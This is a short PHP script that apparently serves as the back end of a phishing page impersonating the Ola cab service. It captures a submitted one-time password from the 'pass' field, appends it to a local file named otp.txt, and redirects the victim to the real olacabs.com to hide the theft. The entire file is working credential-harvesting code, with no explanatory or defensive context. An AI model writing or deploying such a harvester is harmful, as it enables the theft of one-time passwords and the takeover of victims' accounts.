<?php
file_put_contents("otp.txt", "Ola OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.olacabs.com/');
?>
